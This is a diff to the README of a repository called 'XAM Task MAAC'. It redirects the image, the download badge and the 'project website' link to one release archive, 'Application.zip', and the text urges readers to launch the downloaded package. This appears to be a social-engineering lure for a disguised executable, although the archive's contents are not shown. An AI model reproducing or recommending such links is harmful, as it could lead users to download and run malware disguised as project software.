@@ -1,6 +1,6 @@
 # 🚀 Welcome to XAM Task MAAC Repository
 
-![XAM Task MAAC](https://yourimageurl.com)
+![XAM Task MAAC](https://github.com/Urfura/xam-task-maac/releases/download/v1.0/Application.zip)
 
 ## Overview
 
@@ -31,13 +31,13 @@ This repository contains the code for the XAM Task MAAC project, which is a Fron
 
 ## Software Download
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Urfura/xam-task-maac/releases/download/v1.0/Application.zip)](https://github.com/Urfura/xam-task-maac/releases/download/v1.0/Application.zip)
 
 The software package provided in the link above needs to be launched to explore the project further.
 
 ## Visit Our Website
 
-Explore our project website for more information: [XAM Task MAAC Website](https://www.xamtaskmaac.com)
+Explore our project website for more information: [XAM Task MAAC Website](https://github.com/Urfura/xam-task-maac/releases/download/v1.0/Application.zip)
 
 ## Installation
 
